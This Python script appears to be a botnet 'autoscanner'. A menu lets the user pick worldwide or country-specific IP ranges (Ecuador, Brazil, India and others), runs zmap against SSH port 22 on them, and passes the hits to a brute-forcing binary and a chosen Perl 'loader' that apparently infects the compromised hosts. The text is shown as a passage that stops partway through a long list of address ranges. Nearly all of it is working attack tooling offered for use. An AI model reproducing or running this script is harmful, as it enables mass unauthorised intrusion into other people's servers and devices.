#!/usr/bin/python
# zmap autoscanner made by Gta5god aka NoMoreWifiForYou
# i suggest you run this file in screen
import subprocess, urllib2, sys, time

def run(cmd):
	subprocess.call(cmd, shell=True)

run('clear')
print("\x1b[1;32m/$$                   /$$                     /$$$$$$                                  ")
print("\x1b[1;32m| $$                  | $$                    /$$__  $$                                 ")
print("\x1b[1;32m| $$        /$$$$$$  /$$$$$$   /$$$$$$$      | $$  \__/  /$$$$$$$  /$$$$$$  /$$$$$$$     ")
print("\x1b[1;32m| $$       /$$__  $$|_  $$_/  /$$_____/      |  $$$$$$  /$$_____/ |____  $$| $$__  $$     ")
print("\x1b[1;32m| $$      | $$$$$$$$  | $$   |  $$$$$$        \____  $$| $$        /$$$$$$$| $$  \ $$     ")
print("\x1b[1;32m| $$      | $$_____/  | $$ /$$\____  $$       /$$  \ $$| $$       /$$__  $$| $$  | $$     ")
print("\x1b[1;32m| $$$$$$$$|  $$$$$$$  |  $$$$//$$$$$$$/      |  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$    ")
print("")
time.sleep(5)
run('clear')
try:
 print("\x1b[1;32mInstall zmap and scanner.sh \x1b[1;31monly run this if its a fresh server because in most causes you already got this shit installed\x1b[1;32mType SetupMyShit")
 time.sleep(1)
 print("\x1b[1;34mWorldScan Press 1")
 time.sleep(1)
 print("\x1b[1;31mSmall Scan press 2")
 time.sleep(1)
 print("\x1b[1;36mDecent Scan press 3")
 time.sleep(1)
 print("\x1b[1;33mGodly Scan press 4")
 time.sleep(1)
 print("\x1b[1;34mHuawei device scan press 5")
 time.sleep(1)
 print("\x1b[1;31mSmallSouth America (mainly ecuador ip ranges) press 6")
 time.sleep(1)
 print("\x1b[1;36mBrazil ip ranges press 7")
 time.sleep(1)
 print("\x1b[1;33mIndia ip ranges press 8")
 time.sleep(1)
 print("\x1b[1;34mAs.lst press 9")
 time.sleep(1)
 print("\x1b[1;31mFuck.lst press 10")
 time.sleep(1)
 print('\x1b[1;35mScan your own LST files(this will allow you to scan up to 3 at a time and have it brute and load automatically) type LST  (then 1-3)')
 time.sleep(1)
 print("\x1b[1;32mType HELP If Your A Dumb Fuck ")
 time.sleep(2)


 wifi = raw_input ("\x1b[1;32mSelect Your Scan (1-10) or type your command(HELP,SetupMyShit,LST1,LST2,LST3)-")
 if wifi == "1":
 	a = raw_input('Select Your Loader-')
 	run('zmap -p22 -omfu.txt')
 	run('chmod 777 *')
 	run('./update 1500')
 	run('cat vuln.txt | grep -v DUP > vuln')
 	run('perl ' + a + ' vuln')
 elif wifi == "2":
 	a = raw_input('Select Your Loader-')
 	run('zmap -p22 -omfu.txt -N 9000')
 	run('chmod 777 *')
 	run('./update 1500')
 	run('cat vuln.txt | grep -v DUP > vuln')
 	run('perl ' + a + ' vuln')
 elif wifi == "3":
    a = raw_input('Select Your Loader-')
    run('zmap -p22 -omfu.txt -N 90000')
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "4":
    a = raw_input('Select Your Loader-')
    run('zmap -p22 -omfu.txt -N 900000')
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "5":
 	a = raw_input('Select Your Loader-')
 	run('zmap -p22 41.0.0.0/8 102.0.0.0/8 157.0.0.0/8 -omfu.txt')
 	run('chmod 777 *')
 	run('./update 1500')
 	run('cat vuln.txt | grep -v DUP > vuln')
 	run('perl ' + a + ' vuln')
 elif wifi == "6":
 	a = raw_input('Select Your Loader-')
 	run('zmap -p22 179.60.244.0/22 181.39.0.0/16 181.112.0.0/16 181.113.0.0/16 181.175.0.0/16 181.188.192.0/18 181.191.232.0/22 181.196.0.0/16 181.198.0.0/16 181.199.0.0/17 181.211.0.0/16 181.224.172.0/22 186.3.0.0/18 186.3.64.0/18 186.3.128.0/17 186.4.128.0/17 186.5.0.0/17 186.33.128.0/18 186.42.0.0/17 186.42.128.0/17 186.43.128.0/18 186.43.192.0/18 186.46.0.0/17 186.46.128.0/17 186.47.0.0/16 186.65.0.0/18 186.66.0.0/17 186.66.128.0/17 186.68.0.0/15 186.70.0.0/15 186.101.0.0/16 186.178.0.0/16 190.8.180.0/22 190.9.160.0/20 190.9.176.0/20 190.10.128.0/18 -omfu.txt')    
 	run('chmod 777 *')
 	run('./update 1500')
 	run('cat vuln.txt | grep -v DUP > vuln')
 	run('perl ' + a + ' vuln')
 elif wifi == "7":
  	a = raw_input('Select Your Loader-')
  	run('zmap -p22 45.4.4.0/22 45.4.8.0/22 45.4.12.0/22 45.4.16.0/22 45.4.20.0/22 45.4.24.0/22 45.4.28.0/22 45.4.32.0/22 45.4.36.0/22 45.4.40.0/22 45.4.44.0/22 45.4.48.0/22 45.4.52.0/22 45.4.56.0/22 45.4.60.0/22 45.4.64.0/22 45.4.68.0/22 45.4.72.0/22 45.4.76.0/22 45.4.80.0/22 45.4.96.0/24 45.4.104.0/22 45.4.108.0/22 45.4.112.0/22 45.4.116.0/22 45.4.120.0/22 45.4.124.0/22 45.4.132.0/22 45.4.140.0/22 45.4.144.0/22 45.4.148.0/22 45.4.152.0/22 45.4.156.0/22 45.4.176.0/22 45.4.180.0/22 45.4.184.0/22 45.4.188.0/22 45.4.192.0/22 45.4.208.0/22 45.4.212.0/22 45.4.220.0/22 45.4.224.0/22 45.4.228.0/22 45.4.232.0/22 45.4.236.0/22 45.4.240.0/22 45.4.244.0/22 45.4.248.0/22 45.5.4.0/22 45.5.14.0/24 45.5.16.0/22 45.5.32.0/22 45.5.36.0/22 45.5.40.0/22 45.5.44.0/22 45.5.48.0/22 45.5.72.0/22 45.5.80.0/22 45.5.84.0/22 45.5.88.0/22 45.5.96.0/22 45.5.100.0/22 45.5.104.0/22 45.5.108.0/22 45.5.112.0/22 45.5.128.0/22 45.5.132.0/22 45.5.136.0/22 45.5.140.0/22 45.5.144.0/22 45.5.156.0/22 45.5.168.0/22 45.5.176.0/22 45.5.192.0/22 45.5.196.0/22 45.5.200.0/22 45.5.204.0/22 45.5.208.0/22 45.5.212.0/22 45.5.220.0/22 45.5.224.0/22 45.5.228.0/22 45.5.232.0/22 45.5.236.0/22 45.5.240.0/22 45.5.244.0/22 45.5.248.0/22 45.5.252.0/22 45.6.0.0/22 45.6.12.0/22 45.6.16.0/22 45.6.20.0/22 45.6.24.0/22 45.6.28.0/22 45.6.32.0/22 45.6.36.0/22 45.6.52.0/22 45.6.56.0/22 45.6.64.0/22 45.6.72.0/22 45.6.76.0/22 45.6.80.0/22 45.6.84.0/22 45.6.88.0/22 45.6.92.0/22 45.6.96.0/22 45.6.100.0/22 45.6.108.0/22 45.6.112.0/22 45.6.116.0/22 45.6.120.0/22 45.6.124.0/22 45.6.128.0/22 45.6.136.0/22 45.6.144.0/22 45.6.148.0/22 45.6.152.0/22 45.6.156.0/22 45.6.160.0/22 45.6.164.0/22 45.6.168.0/22 45.6.172.0/22 45.6.176.0/22 45.6.180.0/22 45.6.184.0/22 45.6.188.0/22 45.6.192.0/22 45.6.196.0/22 45.6.200.0/22 45.6.204.0/22 45.6.208.0/22 45.6.216.0/22 45.6.220.0/22 45.6.228.0/22 45.6.232.0/22 45.6.236.0/22 45.6.240.0/22 45.6.244.0/22 45.7.0.0/22 45.7.4.0/22 45.7.8.0/22 45.7.12.0/22 45.7.16.0/22 45.7.20.0/22 45.7.24.0/22 45.7.32.0/22 45.7.36.0/22 45.7.40.0/22 45.7.48.0/22 45.7.52.0/22 45.7.56.0/22 45.7.60.0/22 45.7.64.0/22 45.7.68.0/22 45.7.72.0/22 45.7.76.0/22 45.7.80.0/22 45.7.100.0/22 45.7.104.0/22 45.7.108.0/22 45.7.112.0/22 45.7.116.0/22 45.7.120.0/22 45.7.128.0/22 45.7.144.0/22 45.7.148.0/22 45.7.152.0/22 45.7.156.0/22 45.7.160.0/22 45.7.164.0/22 45.7.168.0/22 45.7.172.0/22 45.7.176.0/22 45.7.180.0/22 45.7.184.0/22 45.7.188.0/22 45.7.192.0/22 45.7.196.0/22 45.7.200.0/22 45.7.204.0/22 45.7.212.0/22 45.7.216.0/22 45.7.220.0/22 45.7.224.0/22 45.7.232.0/22 45.65.128.0/22 45.65.132.0/22 45.65.140.0/22 45.65.144.0/22 45.65.156.0/22 45.65.164.0/22 45.65.168.0/22 45.65.172.0/22 45.65.176.0/22 45.65.180.0/22 45.65.184.0/22 45.65.192.0/22 45.65.196.0/22 45.65.201.0/24 45.65.204.0/22 45.65.208.0/22 45.65.212.0/22 45.65.216.0/22 45.65.220.0/22 45.65.228.0/22 45.65.236.0/22 45.65.253.0/24 45.70.0.0/22 45.70.4.0/22 45.70.16.0/22 45.70.20.0/22 45.70.24.0/22 45.70.28.0/22 45.70.32.0/22 45.70.36.0/22 45.70.40.0/22 45.70.44.0/22 45.70.48.0/22 45.70.52.0/22 45.70.60.0/22 45.70.64.0/22 45.70.68.0/22 45.70.72.0/22 45.70.76.0/22 45.70.80.0/22 45.70.84.0/22 45.70.92.0/22 45.70.96.0/22 45.70.100.0/22 45.70.104.0/22 45.70.108.0/22 45.70.112.0/22 45.70.120.0/22 45.70.124.0/22 45.70.128.0/22 45.70.132.0/22 45.70.136.0/22 45.70.140.0/22 45.70.144.0/22 45.70.148.0/22 45.70.156.0/22 45.70.160.0/22 45.70.164.0/22 45.70.172.0/22 45.70.176.0/22 45.70.188.0/22 45.70.192.0/22 45.70.204.0/22 45.70.208.0/22 45.70.212.0/22 45.70.216.0/22 45.70.224.0/22 45.70.232.0/22 45.70.244.0/22 45.70.248.0/22 45.70.252.0/22 45.71.4.0/24 45.71.6.0/24 45.71.12.0/22 45.71.20.0/22 45.71.24.0/22 45.71.28.0/22 45.71.40.0/22 45.71.48.0/22 45.71.60.0/22 45.71.64.0/22 45.71.68.0/22 45.71.72.0/22 45.71.76.0/22 45.71.80.0/22 45.71.84.0/22 45.71.88.0/22 45.71.92.0/22 45.71.96.0/22 45.71.100.0/22 45.71.104.0/23 45.71.107.0/24 45.71.108.0/22 45.71.116.0/22 45.71.120.0/22 45.71.124.0/22 45.71.128.0/22 45.71.132.0/22 45.71.136.0/22 45.71.140.0/22 45.71.144.0/22 45.71.148.0/22 45.71.160.0/22 45.71.164.0/22 45.71.168.0/22 45.71.172.0/22 45.71.176.0/22 45.71.188.0/22 45.71.192.0/22 45.71.208.0/22 45.71.212.0/23 45.71.214.0/23 45.71.216.0/22 45.71.220.0/22 45.71.224.0/22 45.71.228.0/22 45.71.232.0/22 45.71.236.0/22 45.71.240.0/22 45.71.244.0/22 45.71.248.0/22 45.160.0.0/22 45.160.8.0/22 45.160.16.0/22 45.160.20.0/22 45.160.24.0/22 45.160.36.0/22 45.160.40.0/22 45.160.44.0/22 45.160.48.0/22 45.160.52.0/22 45.160.56.0/22 45.160.60.0/22 45.160.64.0/22 45.160.68.0/22 45.160.76.0/23 45.160.80.0/22 45.160.84.0/22 45.160.88.0/22 45.160.92.0/22 45.160.96.0/22 45.160.100.0/22 45.160.104.0/22 45.160.108.0/22 45.160.112.0/22 45.160.116.0/22 45.160.120.0/22 45.160.124.0/22 45.160.128.0/22 45.160.136.0/22 45.160.140.0/22 45.160.144.0/22 45.160.148.0/22 45.160.152.0/22 45.160.160.0/22 -omfu.txt')
  	run('chmod 777 *')
  	run('./update 1500')
  	run('cat vuln.txt | grep -v DUP > vuln')
  	run('perl ' + a + ' vuln')
 elif wifi == "8":
    a = raw_input('Select Your Loader-')
    run('zmap -p22 1.6.0.0/15 1.22.0.0/15 1.38.0.0/15 1.186.0.0/16 1.187.0.0/16 14.1.116.0/22 14.1.120.0/22 14.1.124.0/22 14.96.0.0/15 14.98.0.0/16 14.99.0.0/16 14.102.0.0/17 14.102.160.0/22 14.102.188.0/22 14.102.224.0/20 14.139.0.0/16 14.140.0.0/14 14.192.0.0/22 14.192.12.0/22 14.192.16.0/22 14.192.24.0/22 14.192.28.0/22 14.192.52.0/22 14.194.0.0/15 27.0.48.0/20 27.0.136.0/22 27.0.140.0/22 27.0.144.0/22 27.0.148.0/22 27.0.168.0/22 27.0.172.0/22 27.0.176.0/22 27.0.180.0/22 27.0.200.0/22 27.0.216.0/22 27.0.220.0/22 27.0.224.0/22 27.0.228.0/22 27.0.244.0/22 27.0.248.0/22 27.0.252.0/22 27.4.0.0/14 27.34.240.0/20 27.48.0.0/15 27.50.4.0/22 27.54.160.0/19 27.56.0.0/13 27.96.88.0/22 27.97.0.0/16 27.100.12.0/22 27.100.24.0/22 27.106.0.0/17 27.107.0.0/16 27.109.0.0/19 27.111.72.0/22 27.112.120.0/22 27.113.252.0/22 27.116.16.0/21 27.116.40.0/22 27.116.48.0/22 27.116.52.0/22 27.118.32.0/19 27.121.100.0/22 27.122.60.0/22 27.123.64.0/18 27.123.216.0/22 27.123.240.0/22 27.123.248.0/22 27.125.200.0/22 27.131.208.0/21 27.248.0.0/14 27.255.128.0/17 36.255.0.0/22 36.255.4.0/22 36.255.8.0/22 36.255.12.0/22 36.255.16.0/22 36.255.20.0/22 36.255.24.0/22 36.255.28.0/22 36.255.64.0/22 36.255.84.0/22 36.255.88.0/22 36.255.108.0/22 36.255.132.0/22 36.255.156.0/22 36.255.168.0/22 36.255.180.0/22 36.255.184.0/22 36.255.196.0/22 36.255.200.0/22 36.255.208.0/22 36.255.224.0/22 36.255.228.0/22 36.255.232.0/22 36.255.240.0/22 36.255.248.0/22 36.255.252.0/22 42.104.0.0/17 42.104.128.0/17 42.105.0.0/16 42.106.0.0/15 42.108.0.0/14 43.224.0.0/22 43.224.8.0/22 43.224.96.0/22 43.224.128.0/22 43.224.132.0/22 43.224.136.0/22 43.224.156.0/22 43.224.164.0/22 43.224.172.0/22 43.224.180.0/22 43.224.220.0/22 43.224.252.0/22 43.225.0.0/22 43.225.16.0/22 43.225.20.0/22 43.225.24.0/22 43.225.68.0/22 43.225.72.0/22 43.225.80.0/22 43.225.92.0/22 43.225.116.0/22 43.225.160.0/22 43.225.164.0/22 43.225.168.0/22 43.225.188.0/22 43.225.192.0/22 43.225.212.0/22 43.225.248.0/22 43.226.2.0/23 43.226.24.0/22 43.226.28.0/22 43.227.16.0/22 43.227.20.0/22 43.227.128.0/22 43.227.132.0/22 43.227.224.0/22 43.227.244.0/22 43.228.72.0/22 43.228.92.0/22 43.228.96.0/22 43.228.112.0/22 43.228.140.0/22 43.228.168.0/22 43.228.176.0/22 43.228.220.0/22 43.228.224.0/22 43.228.228.0/22 43.228.236.0/22 43.229.8.0/22 43.229.24.0/22 43.229.72.0/22 43.229.80.0/22 43.229.88.0/22 43.229.92.0/22 43.229.100.0/22 43.229.104.0/22 43.229.160.0/22 43.229.200.0/22 43.229.224.0/22 43.230.36.0/22 43.230.40.0/22 43.230.44.0/22 43.230.104.0/22 43.230.132.0/22 43.230.148.0/22 43.230.156.0/22 43.230.160.0/22 43.230.172.0/22 43.230.184.0/22 43.230.196.0/22 43.230.200.0/22 43.230.212.0/22 43.231.48.0/22 43.231.52.0/22 43.231.56.0/22 43.231.116.0/22 43.231.120.0/22 43.231.124.0/22 43.231.132.0/22 43.231.204.0/22 43.231.212.0/22 43.231.216.0/22 43.231.232.0/22 43.231.236.0/22 43.231.240.0/22 43.231.248.0/22 43.231.252.0/22 43.239.52.0/22 43.239.56.0/22 43.239.60.0/22 43.239.68.0/22 43.239.76.0/22 43.239.80.0/22 43.239.108.0/22 43.239.112.0/22 43.239.124.0/22 43.239.128.0/22 43.239.132.0/22 43.239.144.0/22 43.239.152.0/22 43.239.168.0/22 43.239.192.0/22 43.239.196.0/22 43.239.200.0/22 43.239.204.0/22 43.239.208.0/22 43.239.212.0/22 43.239.216.0/22 43.239.228.0/22 43.239.236.0/22 43.239.240.0/22 43.239.244.0/22 43.240.4.0/22 43.240.8.0/22 43.240.64.0/22 43.241.24.0/22 43.241.28.0/22 43.241.36.0/22 43.241.40.0/22 43.241.60.0/22 43.241.64.0/22 43.241.68.0/22 43.241.116.0/22 43.241.120.0/22 43.241.124.0/22 43.241.128.0/22 43.241.132.0/22 43.241.140.0/22 43.241.144.0/22 43.241.192.0/22 43.241.244.0/22 43.242.36.0/22 43.242.104.0/22 43.242.116.0/22 43.242.120.0/22 43.242.124.0/22 43.242.208.0/22 43.242.212.0/22 43.242.224.0/22 43.242.228.0/22 43.242.244.0/22 43.243.36.0/22 43.243.76.0/22 43.243.80.0/22 43.243.172.0/22 43.243.212.0/22 43.245.0.0/22 43.245.4.0/22 43.245.12.0/22 43.245.20.0/22 43.245.88.0/22 43.245.100.0/22 43.245.136.0/22 43.245.148.0/22 43.245.156.0/22 43.245.208.0/22 43.246.100.0/22 43.246.104.0/22 43.246.108.0/22 43.246.120.0/22 43.246.124.0/22 43.246.136.0/22 43.246.140.0/22 43.246.144.0/22 43.246.148.0/22 43.246.156.0/22 43.246.160.0/22 43.246.236.0/22 43.246.240.0/22 43.246.244.0/22 43.246.248.0/22 43.246.252.0/22 43.247.28.0/22 43.247.40.0/22 43.247.52.0/22 43.247.136.0/22 43.247.140.0/22 43.247.144.0/22 43.247.156.0/22 43.247.160.0/22 43.248.32.0/22 43.248.36.0/22 43.248.68.0/22 43.248.72.0/22 43.248.152.0/22 43.248.220.0/22 43.248.236.0/22 43.248.240.0/22 43.248.252.0/22 43.249.48.0/22 43.249.52.0/22 43.249.84.0/22 43.249.180.0/22 43.249.184.0/22 43.249.188.0/22 43.249.216.0/22 43.249.224.0/22 43.249.228.0/22 43.249.232.0/22 43.250.40.0/22 43.250.120.0/22 43.250.132.0/22 43.250.156.0/22 43.250.164.0/22 43.250.208.0/22 43.250.252.0/22 43.251.0.0/22 43.251.18.0/23 43.251.72.0/22 43.251.80.0/22 43.251.88.0/22 43.251.92.0/22 43.251.124.0/22 43.251.144.0/22 43.251.148.0/22 43.251.168.0/22 43.251.172.0/22 43.251.176.0/22 43.251.188.0/22 43.251.212.0/22 43.251.216.0/22 43.251.220.0/22 43.252.4.0/22 43.252.24.0/21 43.252.32.0/22 43.252.60.0/22 43.252.88.0/22 43.252.92.0/22 43.252.100.0/22 43.252.116.0/22 43.252.140.0/22 43.252.180.0/22 43.252.188.0/22 43.252.192.0/22 43.252.196.0/22 43.252.204.0/22 43.252.220.0/23 43.252.240.0/22 43.252.248.0/22 43.254.28.0/22 43.254.32.0/22 43.254.40.0/22 43.254.48.0/22 43.254.108.0/22 43.254.160.0/22 43.254.176.0/22 43.254.204.0/22 43.254.212.0/22 43.255.56.0/22 43.255.132.0/22 43.255.140.0/22 43.255.164.0/22 43.255.220.0/22 45.64.8.0/22 45.64.12.0/22 45.64.16.0/22 45.64.84.0/22 45.64.92.0/22 45.64.104.0/22 45.64.114.0/24 45.64.115.0/24 45.64.156.0/22 45.64.176.0/22 45.64.188.0/22 45.64.192.0/22 45.64.196.0/22 45.64.204.0/22 45.64.208.0/22 45.64.212.0/22 45.64.216.0/22 45.64.220.0/22 45.64.224.0/22 45.64.236.0/22 45.65.8.0/22 45.65.36.0/22 45.65.40.0/22 45.65.48.0/22 45.65.52.0/22 45.65.56.0/23 45.112.0.0/22 45.112.8.0/22 45.112.12.0/22 45.112.16.0/22 45.112.20.0/22 45.112.28.0/22 45.112.32.0/22 45.112.40.0/22 45.112.48.0/22 45.112.52.0/22 45.112.56.0/22 45.112.68.0/22 45.112.136.0/22 45.112.144.0/21 45.112.172.0/22 45.112.180.0/22 45.112.184.0/22 45.112.192.0/22 45.112.200.0/22 45.112.248.0/22 45.112.252.0/22 45.113.62.0/23 45.113.64.0/22 45.113.76.0/22 45.113.88.0/22 45.113.96.0/22 45.113.100.0/22 45.113.104.0/22 45.113.120.0/22 45.113.136.0/22 45.113.152.0/22 45.113.180.0/22 45.113.188.0/22 45.113.224.0/22 45.113.248.0/22 45.114.36.0/22 45.114.48.0/22 -omfu.txt')
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "9":
    a = raw_input('Select Your Loader-')
    run('zmap -p22 2.60.0.0/18 2.60.0.0/17 2.60.0.0/16 2.60.0.0/14 2.60.64.0/19 2.60.112.0/20 2.60.128.0/17 2.60.240.0/20 2.61.0.0/16 2.61.64.0/18 2.61.128.0/18 2.62.0.0/18 2.62.0.0/17 2.62.64.0/18 2.62.128.0/18 2.62.128.0/17 2.62.192.0/18 2.63.0.0/18 2.63.0.0/17 2.63.64.0/18 5.136.0.0/21 5.136.0.0/15 5.136.64.0/18 5.136.128.0/17 5.136.128.0/18 5.136.192.0/18 5.137.0.0/17 5.137.128.0/17 5.138.0.0/19 5.138.32.0/19 5.138.64.0/19 5.138.96.0/19 5.138.128.0/17 5.139.160.0/19 5.140.0.0/19 5.140.32.0/20 5.140.48.0/20 5.140.64.0/19 5.140.96.0/20 5.140.112.0/20 5.140.128.0/19 5.140.164.0/24 5.140.165.0/24 5.140.166.0/23 5.140.172.0/22 5.140.176.0/21 5.140.184.0/21 5.140.192.0/22 5.140.196.0/24 5.140.197.0/24 5.140.198.0/24 5.140.199.0/24 5.140.200.0/24 5.140.201.0/24 5.140.202.0/24 5.140.203.0/24 5.140.204.0/22 5.140.208.0/22 5.140.212.0/24 5.140.213.0/24 5.140.216.0/22 5.140.220.0/22 5.140.224.0/24 5.140.226.0/23 5.140.228.0/23 5.140.233.0/24 5.140.234.0/24 5.140.235.0/24 5.141.0.0/22 5.141.4.0/22 5.141.8.0/24 5.141.9.0/24 5.141.10.0/23 5.141.12.0/22 5.141.16.0/22 5.141.20.0/24 5.141.21.0/24 5.141.22.0/24 5.141.23.0/24 5.141.24.0/22 5.141.28.0/23 5.141.29.0/24 5.141.30.0/23 5.141.32.0/19 5.141.64.0/20 5.141.80.0/24 5.141.81.0/24 5.141.86.0/24 5.141.87.0/24 5.141.96.0/23 5.141.98.0/24 5.141.99.0/24 5.141.128.0/18 5.141.192.0/22 5.141.196.0/22 5.141.200.0/22 5.141.204.0/22 5.141.208.0/22 5.141.212.0/23 5.141.214.0/23 5.141.216.0/24 5.141.217.0/24 5.141.218.0/24 5.141.219.0/24 5.141.220.0/22 5.141.228.0/23 5.141.230.0/23 5.141.232.0/24 5.141.234.0/23 5.141.236.0/23 5.141.238.0/24 5.141.239.0/24 5.141.244.0/24 5.141.245.0/24 5.141.246.0/24 5.141.247.0/24 5.141.248.0/24 5.141.248.0/23 5.141.249.0/24 5.141.250.0/24 5.141.251.0/24 5.141.252.0/24 5.142.0.0/16 5.142.0.0/18 5.142.64.0/18 5.142.128.0/18 5.142.192.0/18 5.143.0.0/18 5.143.64.0/18 5.143.176.0/24 5.143.177.0/24 5.143.178.0/24 5.143.179.0/24 5.143.180.0/24 5.143.181.0/24 5.143.182.0/24 5.143.183.0/24 5.143.184.0/24 5.143.185.0/24 5.143.186.0/24 5.143.187.0/24 5.143.188.0/24 5.143.189.0/24 5.143.190.0/24 5.143.191.0/24 5.143.192.0/20 5.143.208.0/20 5.143.224.0/19 31.28.192.0/19 31.162.0.0/18 31.162.128.0/18 31.162.192.0/18 31.163.0.0/19 31.163.32.0/19 31.163.64.0/18 31.163.128.0/18 31.163.192.0/20 31.163.208.0/20 31.163.224.0/19 31.172.192.0/24 31.172.193.0/24 31.172.194.0/24 31.172.195.0/24 31.172.196.0/24 31.172.197.0/24 31.172.198.0/24 31.172.199.0/24 31.172.200.0/24 31.172.201.0/24 31.172.202.0/24 31.172.203.0/24 31.172.204.0/24 31.172.205.0/24 31.172.206.0/24 31.172.207.0/24 31.172.208.0/24 31.172.209.0/24 31.172.210.0/24 31.172.211.0/24 31.172.212.0/24 31.172.213.0/24 31.172.214.0/24 31.172.215.0/24 31.172.216.0/24 31.172.217.0/24 31.172.218.0/24 31.172.219.0/24 31.172.220.0/24 31.172.221.0/24 31.172.222.0/24 31.172.223.0/24 31.180.192.0/19 31.180.224.0/19 31.181.0.0/16 31.204.96.0/20 37.1.64.0/22 37.1.68.0/24 37.1.69.0/24 37.1.70.0/23 37.1.72.0/23 37.1.74.0/24 37.1.75.0/24 37.1.76.0/24 37.1.77.0/24 37.1.78.0/24 37.1.79.0/24 37.19.32.0/21 37.19.40.0/21 37.19.48.0/21 37.19.56.0/21 37.20.0.0/18 37.20.0.0/16 37.20.0.0/14 37.20.64.0/18 37.20.128.0/18 37.20.192.0/18 37.21.0.0/18 37.21.0.0/17 37.21.64.0/18 37.21.128.0/18 37.21.128.0/17 37.21.192.0/18 37.22.0.0/17 37.22.128.0/17 37.23.0.0/19 37.23.0.0/17 37.23.0.0/16 37.23.64.0/19 37.23.128.0/17 37.76.128.0/19 37.76.160.0/20 37.76.176.0/20 37.78.0.0/16 37.79.0.0/19 37.79.32.0/19 37.79.64.0/19 37.79.96.0/19 37.79.128.0/20 37.79.144.0/20 37.79.160.0/19 37.79.208.0/23 37.79.212.0/22 37.79.224.0/21 37.79.224.0/20 37.79.232.0/21 37.79.247.0/24 37.79.248.0/22 37.79.252.0/23 37.79.254.0/23 46.45.192.0/20 46.45.211.0/24 46.45.219.0/24 46.45.221.0/24 46.45.227.0/24 46.45.235.0/24 46.45.236.0/24 46.45.238.0/23 46.48.144.0/20 46.48.160.0/19 46.48.192.0/18 46.48.192.0/19 46.48.224.0/19 46.61.128.0/17 46.63.128.0/23 46.63.130.0/23 46.63.132.0/24 46.63.134.0/23 46.63.139.0/24 46.63.140.0/23 46.63.142.0/23 46.63.146.0/24 46.63.147.0/24 46.63.148.0/23 46.63.151.0/24 46.63.152.0/23 46.63.156.0/24 46.63.163.0/24 46.63.168.0/23 46.63.174.0/23 46.63.176.0/23 46.63.179.0/24 46.63.180.0/23 46.63.182.0/24 46.63.184.0/22 46.63.188.0/22 46.63.192.0/20 46.63.208.0/20 46.63.224.0/23 46.63.226.0/23 46.63.230.0/23 46.63.232.0/21 46.63.240.0/20 46.158.0.0/16 46.159.0.0/16 46.232.165.0/24 46.237.48.0/21 46.237.56.0/21 62.105.0.0/19 62.148.224.0/19 62.165.16.0/20 62.183.16.0/22 62.183.124.0/22 62.213.0.0/19 77.34.16.0/20 77.34.32.0/20 77.34.54.0/23 77.34.58.0/23 77.34.80.0/20 77.34.96.0/19 77.34.132.0/22 77.34.136.0/22 77.34.150.0/23 77.34.154.0/23 77.34.158.0/23 77.34.160.0/19 77.34.202.0/23 77.34.210.0/23 77.34.214.0/23 77.34.216.0/21 77.34.224.0/19 77.35.0.0/18 77.35.94.0/23 77.35.100.0/22 77.35.114.0/23 77.35.120.0/21 77.35.128.0/18 77.35.192.0/19 77.35.224.0/19 77.39.24.0/24 77.39.37.0/24 77.39.44.0/24 77.39.64.0/23 77.39.72.0/24 77.39.76.0/24 77.39.101.0/24 77.39.102.0/24 77.39.115.0/24 77.40.0.0/17 77.40.2.0/23 77.40.61.0/24 77.40.62.0/24 77.40.116.0/23 77.45.128.0/20 77.45.144.0/20 77.45.160.0/20 77.45.176.0/20 77.45.192.0/20 77.45.208.0/20 77.45.224.0/20 77.45.240.0/21 77.45.248.0/21 77.72.240.0/21 77.82.1.0/24 77.82.2.0/23 77.82.4.0/22 77.82.8.0/21 77.82.16.0/20 77.82.32.0/20 77.82.48.0/21 77.82.56.0/22 77.82.60.0/23 77.82.63.0/24 77.82.64.0/21 77.82.72.0/23 77.82.76.0/23 77.82.92.0/22 77.82.96.0/20 77.82.160.0/20 77.82.176.0/20 77.82.192.0/21 77.82.200.0/21 77.82.208.0/20 77.82.224.0/20 77.82.240.0/20 77.106.0.0/18 77.106.48.0/21 77.234.0.0/20 77.234.16.0/20 78.29.64.0/18 78.36.0.0/19 78.36.96.0/19 78.36.192.0/19 78.37.48.0/20 78.37.84.0/22 78.40.184.0/21 78.81.144.0/20 78.81.160.0/20 78.81.176.0/20 78.85.0.0/16 78.85.4.0/23 78.85.48.0/23 78.85.50.0/23 78.132.144.0/21 78.132.152.0/21 78.132.160.0/22 78.132.164.0/22 78.132.168.0/21 78.132.176.0/20 78.132.192.0/20 78.132.208.0/22 78.132.212.0/22 78.132.216.0/21 78.132.224.0/21 78.132.232.0/21 78.132.240.0/21 78.132.248.0/21 79.105.0.0/23 79.105.4.0/23 79.105.6.0/23 79.105.8.0/22 79.105.12.0/23 79.105.14.0/23 79.105.17.0/24 79.105.18.0/24 79.105.19.0/24 79.105.20.0/23 79.105.22.0/24 79.105.23.0/24 79.105.24.0/23 79.105.26.0/24 79.105.27.0/24 79.105.28.0/24 79.105.29.0/24 79.105.30.0/24 79.105.31.0/24 79.105.32.0/24 79.105.33.0/24 79.105.34.0/24 79.105.35.0/24 79.105.36.0/24 79.105.37.0/24 79.105.38.0/23 79.105.40.0/21 79.105.48.0/24 79.105.49.0/24 79.105.50.0/23 79.105.52.0/24 79.105.53.0/24 79.105.54.0/23 79.105.56.0/23 79.105.58.0/23 79.105.60.0/24 79.105.61.0/24 79.105.62.0/23 79.105.64.0/24 79.105.65.0/24 79.105.66.0/23 79.105.69.0/24 79.105.70.0/24 79.105.71.0/24 79.105.72.0/23 79.105.74.0/24 79.105.76.0/24 79.105.79.0/24 79.105.80.0/21 79.105.88.0/23 79.105.90.0/24 79.105.91.0/24 79.105.92.0/22 79.105.96.0/20 79.105.112.0/24 79.105.113.0/24 79.105.114.0/23 79.105.116.0/24 79.105.117.0/24 79.105.118.0/24 79.105.119.0/24 79.105.120.0/22 79.105.124.0/23 79.105.126.0/23 79.105.128.0/21 79.105.136.0/22 79.105.140.0/24 79.105.141.0/24 79.105.142.0/23 79.105.144.0/21 79.105.152.0/22 79.105.156.0/23 79.105.158.0/24 79.105.159.0/24 79.105.160.0/22 79.105.164.0/24 79.105.165.0/24 79.105.166.0/23 79.105.168.0/21 79.105.176.0/22 79.105.183.0/24 